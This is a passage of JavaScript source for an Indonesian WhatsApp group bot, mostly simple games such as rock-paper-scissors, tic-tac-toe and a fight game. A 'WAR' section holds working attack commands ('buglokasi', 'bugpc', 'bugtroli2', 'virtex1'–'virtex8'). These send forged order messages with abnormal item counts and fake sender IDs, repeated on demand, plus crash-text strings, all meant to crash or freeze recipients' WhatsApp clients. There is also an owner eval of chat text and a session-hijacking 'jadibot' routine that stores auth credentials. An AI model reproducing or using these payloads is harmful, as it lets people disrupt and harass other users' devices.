zeroyt7.sendMessage(from, '_40 Detik lagi..._', text) 
}, 20000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_50 Detik lagi..._', text) 
}, 10000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_60 Detik lagi..._', text) 
}, 2500) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, tebakjenaka, text, {quoted: fstatus}) 
}, 0) // 1000 = 1s,
break
case 'suit': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!q) return reply(`Kirim perintah ${prefix}suit [pilihan]\nContoh: ${prefix}suit gunting`)
if (!q.match(/batu|gunting|kertas/)) return reply(`Format salah!`)
if (q.match(/batu|gunting|kertas/)) {
await sleep(2000)
var computer = Math.random();
if (computer < 0.34) {
computer = 'batu';
} else if (computer >= 0.34 && computer < 0.67) {
computer = 'gunting';
} else {
computer = 'kertas';
}
if (q == computer) {
reply(`*RESULT*\n\nPertandingan Seri!`)
} else if (q == 'batu') {
if (computer == 'gunting') {
reply(`*RESULT*\n\n• You: Batu\n• Computer: Gunting\n\nCongrats You win!`)
} else {
reply(`*RESULT*\n\n• You: Batu\n• Computer: Kertas\n\nYou lose:(`)
}
} else if (q == 'gunting') {
if (computer == 'batu') {
reply(`*RESULT*\n\n• You: Gunting\n• Computer: Batu\n\nYou lose:(`)
} else {
reply(`*RESULT*\n\n• You: Gunting\n• Computer: Kertas\n\nCongrats You win!`)
}
} else if (q == 'kertas') {
if (computer == 'batu') {
reply(`*RESULT*\n\n• You: Kertas\n• Computer: Batu\n\nCongrats You win!`)
} else {
reply(`*RESULT*\n\n• You: Kertas\n• Computer: Gunting\n\nYou lose:(`)
}
}
}
break
case 'tictactoe': 
case 'ttt': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isGroup) return reply(mess.only.group)
if (args.length < 1) return reply('Tag Lawan Anda! ')
if (isTTT) return reply('Sedang Ada Permainan Di Grub Ini, Harap Tunggu')
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target Lawan!')
ment = mek.message.extendedTextMessage.contextInfo.mentionedJid
player1 = sender
player2 = ment[0]
angka = ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]
id = from
gilir = player2
ky_ttt.push({player1,player2,id,angka,gilir})
zeroyt7.sendMessage(from, 
`*🎳 Memulai Game Tictactoe 🎲*

[@${player2.split('@')[0]}] Menantang anda untuk menjadi lawan Game🔥
Ketik Y/N untuk menerima atau menolak permainan

Ket : Ketik /resetgame , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {contextInfo: {mentionedJid: [player2]}})
break
case 'delsesittt': 
case 'resetgame': 
case 'delttt': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isGroup) return reply(mess.only.group)
if (!isTTT) return reply('Tidak Ada Permainan Di Grub Ini')
naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
ky_ttt = naa 
reply('Sukses Mereset Game')
break
case 'gelud': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isGroup) return reply(mess.only.group)
if (mek.message.extendedTextMessage.contextInfo.mentionedJid > 1) return reply('Hanya bisa dengan 1 orang')
if (!mek.message.extendedTextMessage.contextInfo.mentionedJid[0]) return
if (args.length === 0) return reply(`Tag Lawan Yang Ingin Diajak Bermain Game`)
if (fs.existsSync(`./F4/${from}.json`)) return reply(`Sedang Ada Sesi, tidak dapat dijalankan secara bersamaan\nKetik *${prefix}delsesigelud*, untuk menghapus sesi`)
gelutSkuy = setGelud(`${from}`)
gelutSkuy.status = false
gelutSkuy.Z = sender.replace("@s.whatsapp.net", "")
gelutSkuy.Y = args[0].replace("@", "");
fs.writeFileSync(`./F4/${from}.json`, JSON.stringify(gelutSkuy, null, 2))
starGame = `👑 Memulai Game Baku Hantam ????

• @${sender.replace("@s.whatsapp.net", "")} Menantang Bergelud
[ ${args[0]} ] Ketik Y/N untuk menerima atau menolak permainan`
zeroyt7.sendMessage(from, starGame, text, {quoted: mek, contextInfo: { mentionedJid: [sender, args[0].replace("@", "") + "@s.whatsapp.net"],}})
break
case 'delsesigelud': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isGroup) return reply(mess.only.group)
if (fs.existsSync('./F4/' + from + '.json')) {
fs.unlinkSync('./F4/' + from + '.json')
reply('Berhasil Menghapus Sesi Gelud')
   } else {
reply('Tidak ada sesi yang berlangsung')
}
break
   
//━━━━━━━━━━━━━━━[ PREMIUM ]━━━━━━━━━━━━━━━━━//

// case 'jadibot': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
client.version = [2, 4143, 4]
client.browserDescription = ['Dcode Denpa','Desktop','3.0']
if (args[0] && args[0].length > 200) {
	let json = Buffer.from(args[0], 'base64').toString('utf-8')
    let obj = JSON.parse(json)
    await client.loadAuthInfo(obj)
}
try {
client.on('qr' ,async qr => {
qrbot = await qrkode.toDataURL(qr, { scale: 8 })
buffqr = await Buffer.from(qrbot.split('data:image/png;base64,')[1], 'base64')
await fs.writeFileSync(`./jadibot@${sender}.jpg`, buffqr)
let scen = await zeroyt7.sendMessage(from, fs.readFileSync(`./jadibot@${sender}.jpg`), MessageType.image, {quoted : mek,caption: 'Scan QR ini untuk jadi bot sementara!\n1. Klik titik tiga di pojok kanan atas\n2. Ketuk WhatsApp Web\n3. Scan QR ini \n\nQR Expired dalam 20 detik'})    
setTimeout(() => {
       zeroyt7.deleteMessage(from, scen.key)
  }, 30000);
})  
client.on ('open', async () => {
  console.log ('credentials update')
  const authInfo = client.base64EncodedAuthInfo()
  fs.writeFileSync(`./F4/${sender}.json`, JSON.stringify(authInfo  ,null, '\t'))
  await client.sendMessage('0@s.whatsapp.net', `Kamu bisa login tanpa qr dengan pesan dibawah ini`, MessageType.extendedText)
  client.sendMessage('0@s.whatsapp.net', `${prefix + command} ${Buffer.from(JSON.stringify(authInfo)).toString('base64')}`, MessageType.extendedText)
})
client.on('chat-update', async (chat) => {
	require('./zeroyt7.js')(client, chat)
})    
await client.connect().then(async ({user}) => {
reply('Berhasil tersambung dengan WhatsApp - mu.\n*NOTE: Ini cuma numpang*\n' + JSON.stringify(user, null, 2))
})
} catch {
reply('Error! hanya 1 orang yang dapat mengakses fitur jadibot')
}
break
// case 'stopjadibot': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
try {
reply('Oke')
fs.unlinkSync(`./F4/${sender}.json`)
client.close()
} catch {
reply('Oke')
client.close()
}
break

//━━━━━━━━━━━━━━━[ WAR ]━━━━━━━━━━━━━━━━━//

case 'buglokasi': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isPremium && !isOwner && !mek.key.fromMe ) return reply(mess.only.owner)
zeroyt7.updatePresence(from, Presence.composing)
   zeroyt7.sendMessage(from, {degreesLatitude: 34.0184,
degreesLongitude: -118.411,
name: `${ownername}`,
address: `${botname}`,
jpegThumbnail: zero },location,{
 quoted: {
  key: {
   participant: '111111111@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
itemCount: 70000, // Bug
status: 1,
surface: 1,
message: `${ownername}`,
orderTitle: `${botname}`, // 
sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
break
case 'bugpc': 
case 'bugpc': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isPremium && !isOwner && !mek.key.fromMe ) return reply(mess.only.owner)
zeroyt7.updatePresence(from, Presence.composing)
zeroyt7.sendMessage(from, 'yaudah oke',text, {
 quoted: {
  key: {
   participant: '1111111111@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
itemCount: 70000, // Bug
status: 1,
surface: 1,
message: `${botname}`,
orderTitle: `${ownername}`, // 
sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
break
case 'bugtroli2': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isPremium && !isOwner && !mek.key.fromMe ) return reply(mess.only.owner)
if (args.length < 1) return reply('Jumlahnya?')
zeroyt7.updatePresence(from, Presence.composing)
try {
var hets = `${botname}`
var grousp = await zeroyt7.groupMetadata(from)
var membere = grousp['participants']
var mems = []
membere.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
text: hets,
contextInfo: { mentionedJid: mem },
quoted: mek
}
for (let i = 0; i < args[0]; i++) {
zeroyt7.sendMessage(from, options, text, {quoted:{ 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "62882248593508@s.whatsapp.net" } : {}) 
},
"message": {
"orderMessage": {
"orderId": "173388341205594",
"itemCount": -3599964009,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${botname}`,
"orderTitle": `${ownername}`,
"sellerJid": "6283161567237@s.whatsapp.net",
"token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
}}}})
}
} catch {
  for(let i=0;i<10;i++){
zeroyt7.sendMessage(from, 'Berhasil Mengirim Bug Troli2', text, {quoted:{ 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "62882248593508@s.whatsapp.net" } : {}) 
},
"message": {
"orderMessage": {
"orderId": "173388341205594",
"itemCount": -3599964009,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${botname}`,
"orderTitle": `${ownername}`,
"sellerJid": "6283161567237@s.whatsapp.net",
"token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
}}}})
}
}
break
case 'virtex1': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isPremium && !isOwner && !mek.key.fromMe ) return sendButMessage (mess.only.prem) 
reply(virtex)
break
case 'virtex2': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isPremium && !isOwner && !mek.key.fromMe ) return sendButMessage (mess.only.prem) 
reply(virtex2)
break
case 'virtex3': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isPremium && !isOwner && !mek.key.fromMe ) return sendButMessage (mess.only.prem) 
reply(virtex3)
break
case 'virtex4': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isPremium && !isOwner && !mek.key.fromMe ) return sendButMessage (mess.only.prem) 
reply(virtex4)
break
case 'virtex5': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isPremium && !isOwner && !mek.key.fromMe ) return sendButMessage (mess.only.prem) 
reply(virtex5)
break
case 'virtex6': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isPremium && !isOwner && !mek.key.fromMe ) return sendButMessage (mess.only.prem) 
reply(virtex6)
break
case 'virtex7': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isPremium && !isOwner && !mek.key.fromMe ) return sendButMessage (mess.only.prem) 
reply(virtex7)
break
case 'virtex8': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isPremium && !isOwner && !mek.key.fromMe ) return sendButMessage (mess.only.prem) 
reply(virtex8)
break
case 'vipi': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isPremium && !isOwner && !mek.key.fromMe ) return sendButMessage (mess.only.prem) 
reply(vipi)
break

//━━━━━━━━━━━━━━━[ AKHIR DARI SEMUA FITUR ]━━━━━━━━━━━━━━━━━//

default:
if (budy.includes(`cekprefix`)) {
reply(`prefix saat ini : ${prefix}`)
}
if (fs.existsSync(`./F4/${from}.json`)) {
	gelutSkuy = setGelud(`${from}`)
	if (sender == `${gelutSkuy.Y}@s.whatsapp.net` && budy.toLowerCase() == 'y') {
		if (gelutSkuy.status) return reply(`Game telah dimulai sebelumnya!`)
		gelutSkuy.status = true
		rand0m = [ gelutSkuy.Z, gelutSkuy.Y ]
		winR = rand0m[Math.floor(Math.random() * rand0m.length)]
		fs.writeFileSync(`./F4/${from}.json`, JSON.stringify(gelutSkuy, null, 2))
		starGame = `👑 Gelud Game 🤙🏻 

Diantara @${gelutSkuy.Z} & @${gelutSkuy.Y}
• Pemenangnya adalah [ @${winR} ] `
	   zeroyt7.sendMessage(from, starGame, text, {quoted: mek, contextInfo: { mentionedJid: [winR + "@s.whatsapp.net", gelutSkuy.Z + "@s.whatsapp.net", gelutSkuy.Y + "@s.whatsapp.net",]}})
		fs.unlinkSync("./F4/" + from + ".json");
	} else if (sender == `${gelutSkuy.Y}@s.whatsapp.net` &&  budy.toLowerCase() == 'n') {
		zeroyt7.sendMessage(from, `👑 Game Gelud Rejected 🤙🏻
• @${gelutSkuy.Y} Menolak🤙🏻`, text, {quoted: mek, contextInfo: { mentionedJid: [gelutSkuy.Y + "@s.whatsapp.net"]}})
		fs.unlinkSync("./F4/" + from + ".json");
	}
}
if (isTTT && isPlayer2){
if (budy.startsWith('Y')){
  tto = ky_ttt.filter(ghg => ghg.id.includes(from))
  tty = tto[0]
  angka = tto[0].angka
  ucapan = 
`*🎳 Game Tictactoe 🎲*

Player1 @${tty.player1.split('@')[0]}=❎
Player2 @${tty.player2.split('@')[0]}=⭕

Giliran = @${tty.player1.split('@')[0]}

   ${angka[1]}${angka[2]}${angka[3]}
   ${angka[4]}${angka[5]}${angka[6]}
   ${angka[7]}${angka[8]}${angka[9]}`
  zeroyt7.sendMessage(from, ucapan, text, {quoted: fstatus, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
  }
if (budy.startsWith('N')){
tto = ky_ttt.filter(ghg => ghg.id.includes(from))
tty = tto[0]
naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
ky_ttt = naa
zeroyt7.sendMessage(from, `Yahh @${tty.player2.split('@')[0]} Menolak:(`,text,{quoted:mek,contextInfo:{mentionedJid:[tty.player2]}})
}
}

if (isTTT && isPlayer1){
nuber = parseInt(budy)
if (isNaN(nuber)) return
if (nuber < 1 || nuber > 9) return reply('Masukan Angka Dengan Benar')
main = ky_ttt.filter(hjh => hjh.id.includes(from)) 
if (!tttawal.includes(main[0].angka[nuber])) return reply('Udah Di Isi, Isi Yang Lain Gan')
if (main[0].gilir.includes(sender)) return reply('Tunggu Giliran Gan')
s = '❎'
main[0].angka[nuber] = s
main[0].gilir = main[0].player1
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
ky_ttt = naa
pop = main[0]
ky_ttt.push(pop)
tto = ky_ttt.filter(hgh => hgh.id.includes(from))
tty = tto[0]
angka = tto[0].angka
ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`

ucapmenang = () => {
ucapan1 = 
`*🎳Result Game Tictactoe 🎲*

*Yeyyy Permainan Di Menangkan Oleh* @${tty.player1.split('@')[0]}\n
*Ingin bermain lagi? ${prefix}tictactoe*`
ucapan2 = `*🎳Result Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
zeroyt7.sendMessage(from, ucapan1, text, {quoted: fstatus, contextInfo:{mentionedJid: [tty.player1]}})
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}

if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang()

if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang()

if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang()

if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang()

if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang()

if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang()

if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang()

if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang()

if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && ! ttt.includes('4️⃣') && !
ttt.includes('5️⃣') && !
ttt.includes('6️⃣') && ! ttt.includes('7️⃣') && ! ttt.includes('8️⃣') && ! ttt.includes('9️⃣')){
ucapan1 = `*🎳 Result Game Tictactoe 🎲*

*_Permainan Seri ??👌_*`
ucapan2 = `*🎳 Result Game Tictactoe ??*

*Hasil Akhir:*

${ttt}`
reply(ucapan1)
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}
ucapan = `*🎳 Game Tictactoe 🎲*

Player2 @${tty.player2.split('@')[0]}=⭕
Player1 @${tty.player1.split('@')[0]}=❎

Giliran = @${tty.player2.split('@')[0]}

${ttt}`
zeroyt7.sendMessage(from, ucapan, text, {quoted: fstatus, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
}
if (isTTT && isPlayer2){
nuber = parseInt(budy)
if (isNaN(nuber)) return
if (nuber < 1 || nuber > 9) return reply('Masukan Angka Dengan Benar')
main = ky_ttt.filter(hjh => hjh.id.includes(from)) 
if (!tttawal.includes(main[0].angka[nuber])) return reply('Udah Di Isi, Isi Yang Lain Gan')
if (main[0].gilir.includes(sender)) return reply('Tunggu Giliran Gan')
s = '⭕'
main[0].angka[nuber] = s
main[0].gilir = main[0].player2
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
ky_ttt = naa
pop = main[0]
ky_ttt.push(pop)
tto = ky_ttt.filter(hgh => hgh.id.includes(from))
tty = tto[0]
angka = tto[0].angka
ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`

ucapmenang = () => {
ucapan1 = `*🎳 Result Game Tictactoe 🎲*

*Yeyyy Permainan Di Menangkan Oleh* @${tty.player2.split('@')[0]}\n
*Ingin bermain lagi? ${prefix}tictactoe*`
ucapan2 = `*🎳 Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
zeroyt7.sendMessage(from, ucapan1, text, {quoted:mek, contextInfo:{mentionedJid: [tty.player2]}})
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}

if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang()
if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang()
if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang()
if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang()
if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang()
if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang()
if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang()
if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang()
if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && ! ttt.includes('4️⃣') && !
ttt.includes('5️⃣') && !
ttt.includes('6️⃣') && ! ttt.includes('7️⃣') && ! ttt.includes('8️⃣') && ! ttt.includes('9️⃣')){
ucapan1 = `*??Result Game Tictactoe 🎲*

*_Permainan Seri🗿👌*`
ucapan2 = `*🎳 Result Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
reply(ucapan1)
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}
ucapan = `*🎳 Game Tictactoe 🎲*

Player1 @${tty.player1.split('@')[0]}=⭕
Player2 @${tty.player2.split('@')[0]}=❎
   
Giliran = @${tty.player1.split('@')[0]}

${ttt}`
 zeroyt7.sendMessage(from, ucapan, text, {quoted: fstatus, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
} else {
}
if (isOwner) {
if (budy.startsWith('>')) {
console.log(color('[EVAL1]'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`eval return`))
try {
	let evaled = await eval(budy.slice(2))
	if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
	reply(`${evaled}`)
} catch (err) {
	reply(`${err}`)
}
} else if (budy.startsWith('x')) {
console.log(color('[EVAL2]'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`eval identy`))
try {
	return zeroyt7.sendMessage(from, JSON.stringify(eval(budy.slice(2)), null, '\t'), text, { quoted: fstatus })
} catch (err) {
	e = String(err)
	reply(e)
}
}
}
}
} catch (e) {
e = String(e)
if (!e.includes("this.isZero") && !e.includes("jid")) {
console.log('Error : %s', color(e, 'red'))
}
// console.log(e)
}
}



